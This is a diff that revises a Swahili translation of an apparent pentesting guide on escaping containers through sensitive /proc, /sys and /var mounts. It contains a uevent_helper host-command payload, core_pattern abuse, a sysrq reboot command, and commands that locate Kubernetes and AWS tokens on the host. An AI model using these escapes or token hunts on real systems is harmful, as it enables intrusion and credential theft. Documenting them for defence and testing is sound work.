@@ -16,7 +16,7 @@ Hii directory inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupit
 
 - Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
 - Inaruhusu kufafanua programu ya kutekeleza wakati wa uzalishaji wa core-file na bytes 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa msimbo ikiwa faili inaanza na bomba `|`.
-- **Mfano wa Kujaribu na Kutumia**:
+- **Mfano wa Upimaji na Ukatili**:
 
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Jaribu ufikiaji wa kuandika
@@ -27,7 +27,7 @@ sleep 5 && ./crash & # Trigger handler
 
 #### **`/proc/sys/kernel/modprobe`**
 
-- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Imeelezwa kwa undani katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Ina njia ya mzigo wa moduli ya kernel, inayotumika kwa kupakia moduli za kernel.
 - **Mfano wa Kuangalia Ufikiaji**:
 
@@ -49,7 +49,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
 
 - Inaruhusu kujiandikisha kwa waandishi wa tafsiri kwa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
 - Inaweza kusababisha kupanda kwa haki au ufikiaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
-- Uthibitisho wa husika na maelezo:
+- Ukatili na maelezo yanayohusiana:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -71,7 +71,7 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 #### **`/proc/kmsg`**
 
-- Inafichua ujumbe wa buffer ya ring ya kernel.
+- Inafichua ujumbe wa buffer wa ring wa kernel.
 - Inaweza kusaidia katika mashambulizi ya kernel, uvujaji wa anwani, na kutoa taarifa nyeti za mfumo.
 
 #### **`/proc/kallsyms`**
@@ -85,7 +85,7 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 - Inafanya kazi na kifaa cha kumbukumbu ya kernel `/dev/mem`.
 - Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
-- Zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Zaidi juu ya [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
@@ -96,17 +96,17 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 #### **`/proc/kmem`**
 
-- Njia mbadala kwa `/dev/kmem`, inawakilisha kumbukumbu ya virtual ya kernel.
+- Kiolesura mbadala kwa `/dev/kmem`, kinawakilisha kumbukumbu ya virtual ya kernel.
 - Inaruhusu kusoma na kuandika, hivyo kubadilisha moja kwa moja kumbukumbu ya kernel.
 
 #### **`/proc/mem`**
 
-- Njia mbadala kwa `/dev/mem`, inawakilisha kumbukumbu ya kimwili.
-- Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi za kimwili.
+- Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu ya kimwili.
+- Inaruhusu kusoma na kuandika, mabadiliko ya kumbukumbu yote yanahitaji kutatua anwani za virtual hadi za kimwili.
 
 #### **`/proc/sched_debug`**
 
-- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa PID namespace.
+- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa namespace ya PID.
 - Inafichua majina ya mchakato, IDs, na vitambulisho vya cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
@@ -119,22 +119,22 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/sys/kernel/uevent_helper`**
 
 - Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
-- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzishwa kwa `uevent`.
-- **Mfano wa Kutumia**: %%%bash
+- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mipaka wakati wa kuanzisha `uevent`.
+- **Mfano wa Ukatili**: %%%bash
 
 #### Inaunda payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Inapata njia ya mwenyeji kutoka OverlayFS mount kwa kontena
+#### Inapata njia ya mwenyeji kutoka kwa OverlayFS mount kwa kontena
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Inaweka uevent_helper kwa msaidizi mbaya
+#### Inapanga uevent_helper kwa msaidizi mbaya
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-#### Inachochea uevent
+#### Inasababisha uevent
 
 echo change > /sys/class/mem/null/uevent
 
@@ -152,18 +152,18 @@ cat /output %%%
 
 #### **`/sys/kernel/security`**
 
-- Ina nyumba ya interface ya `securityfs`, inayoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
+- Ina nyumba ya kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
 - Ufikiaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.
 
 #### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**
 
-- Inafichua interfaces za kuingiliana na mabadiliko ya EFI katika NVRAM.
-- Usanidi mbaya au matumizi yanaweza kusababisha kompyuta zisizoweza kuanzishwa au kompyuta za mwenyeji zisizoweza kuanzishwa.
+- Inafichua violesura vya kuingiliana na mabadiliko ya EFI katika NVRAM.
+- Mipangilio isiyo sahihi au ukatili inaweza kusababisha kompyuta zisizoweza kuanzishwa au kuharibiwa.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` inatoa interface ya "hakuna sheria" ya kujaribu kernel.
-- Historia ya masuala ya usalama kutokana na asili yake isiyo na mipaka.
+- `debugfs` inatoa kiolesura cha "hakuna sheria" kwa ufuatiliaji wa kernel.
+- Historia ya matatizo ya usalama kutokana na asili yake isiyo na mipaka.
 
 ### `/var` Vulnerabilities
 
@@ -228,13 +228,17 @@ Unaweza pia kubadilisha faili za usanidi, binaries, huduma, faili za programu, n
 
 Kontena linaweza kusoma tokeni za K8s serviceaccount au tokeni za AWS webidentity ambazo zinamruhusu kontena kupata ufikiaji usioidhinishwa kwa K8s au wingu:
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 #### Docker
 
 Ukatili katika Docker (au katika matumizi ya Docker Compose) ni sawa kabisa, isipokuwa kwamba kawaida
-faili za mifumo ya faili ya kontena zingine zinapatikana chini ya njia tofauti ya msingi:
+faili za mifumo ya faili ya kontena nyingine zinapatikana chini ya njia tofauti:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
@@ -250,11 +254,11 @@ drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269
 drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
 <SNIP>
 ```
-#### Note
+#### Kumbuka
 
-Njia halisi zinaweza kutofautiana katika mipangilio tofauti, ndiyo maana njia bora ni kutumia amri ya **find** kutafuta mifumo ya faili ya kontena zingine.
+Njia halisi zinaweza kutofautiana katika mipangilio tofauti, ndiyo maana njia bora ni kutumia amri ya **find** kutafuta mifumo ya faili ya kontena nyingine na tokeni za SA / utambulisho wa wavuti.
 
-### References
+### Marejeleo
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
